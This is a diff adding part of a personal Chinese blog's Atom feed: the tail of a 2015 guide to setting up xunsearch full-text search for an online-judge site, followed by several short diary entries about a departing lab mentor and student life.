+<p>###1.简介<br>全文检索是通过用户的输入关键词来快速搜索显示结果，来实现一个简单的一个搜索引擎。从而使OJ平台能够更加方便、快速的搜索题目信息。</p>
+<p>本功能通过<a href="http://www.xunsearch.com" target="_blank" rel="external">迅搜(xunsearch)</a>以及PHP+HTML实现（目前在OS X10.10.1+Ubuntu14.04下测试通过）。</p>
+<p>###2.安装</p>
+<blockquote>
+<p>1.访问<a href="http://www.xunsearch.com/site/download" target="_blank" rel="external">xunsearch官网</a>,下载、安装适合自己系统的xunsearch全文检索引擎。<a href="http://www.xunsearch.com/doc/php/guide/start.installation" target="_blank" rel="external">安装步骤</a></p>
+<p>2.用ifconfig查看本机IP地址(下文中假设为a.b.c.d)，在<strong>/xunsearch/sdk/php/app/</strong>目录添加一个test.ini文件#############</p>
+<p>3.进入<strong>/xunsearch/</strong>目录执行<br><code>bin/xs-ctl.sh -b a.b.c.d start</code>即可启动文件检索服务器。</p>
+</blockquote>
+<p>###3.使用</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#OJ全文检索功能文档(Alpha0.1)</p>
+<p>Written by Radish.  2015.9</p>
+<hr>
+<p>###1.简介<br>全文检索是通过用户的输入关键词来快速搜索显示结果，来实现一个简单的一个搜索引擎。从而使OJ平台能够更加方便、快速的搜]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/09/10/2015.9.10/"/>
+    <id>http://kersujd.tk/2015/09/10/2015.9.10/</id>
+    <published>2015-09-10T14:59:08.000Z</published>
+    <updated>2015-09-10T14:59:08.000Z</updated>
+    <content type="html"><![CDATA[<p>#2015.9.10<br>国际教师节。</p>
+<p>今天在新实验室里，感觉还不错，自己班的同学也不怕混不熟。</p>
+<p>老子也终于搞明白了scrapy是怎么爬的。</p>
+<p>唯一忘不掉的，就是老王走的时候的那个背影，现在想想，还是想流泪。</p>
+<p>我相信，一切都会好起来。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#2015.9.10<br>国际教师节。</p>
+<p>今天在新实验室里，感觉还不错，自己班的同学也不怕混不熟。</p>
+<p>老子也终于搞明白了scrapy是怎么爬的。</p>
+<p>唯一忘不掉的，就是老王走的时候的那个背影，现在想想，还是想流泪。</p>
+<p>我相信，]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/09/08/2015.9.8/"/>
+    <id>http://kersujd.tk/2015/09/08/2015.9.8/</id>
+    <published>2015-09-08T15:17:52.000Z</published>
+    <updated>2015-09-08T15:17:52.000Z</updated>
+    <content type="html"><![CDATA[<p>#2015.9.8<br>今晚上，吃了散伙饭，老王仿佛有说不完的话，对我们。</p>
+<p>今晚上，收拾实验室，老王原来留下了这么多有用的东西，甚至给zyj的补考资料都准备好了，我们没想到。</p>
+<p>原来，遇见是为了不久就要到来的离别，感谢遇见，我们青山不改，绿水长流。</p>
+<p>我终于有了自己的一台台式电脑，我打算装上Ubuntu15，或者kali，然后拿它装docker或者玩破解无线网。</p>
+<p>然而我并没有太高兴，感谢你，老王。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#2015.9.8<br>今晚上，吃了散伙饭，老王仿佛有说不完的话，对我们。</p>
+<p>今晚上，收拾实验室，老王原来留下了这么多有用的东西，甚至给zyj的补考资料都准备好了，我们没想到。</p>
+<p>原来，遇见是为了不久就要到来的离别，感谢遇见，我们青山不改，绿水长流]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/09/06/2015.9.6.2/"/>
+    <id>http://kersujd.tk/2015/09/06/2015.9.6.2/</id>
+    <published>2015-09-06T14:59:06.000Z</published>
+    <updated>2015-09-06T14:59:06.000Z</updated>
+    <content type="html"><![CDATA[<p>#2015.9.6</p>
+<p>##有一天我会找到她 她和想象中的一模一样</p>
+<p>她是我的归属，是我生命中的阳光，她是我的信仰。</p>
+<p>我今天帮老王把实验室里的东西搬走了，他一直问我我要去哪，我说我还没想好。</p>
+<p>我哪也不去。</p>
+<p>我问他他去哪，他说了句，我没听懂。</p>
+<p>好在我们都不在实验室了。</p>
+<p>愿以后的路，荆棘伤不了我的心。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#2015.9.6</p>
+<p>##有一天我会找到她 她和想象中的一模一样</p>
+<p>她是我的归属，是我生命中的阳光，她是我的信仰。</p>
+<p>我今天帮老王把实验室里的东西搬走了，他一直问我我要去哪，我说我还没想好。</p>
+<p>我哪也不去。</p>
+<p>我问]]>
+    </summary>
+    
+  </entry>
+  
+</feed>
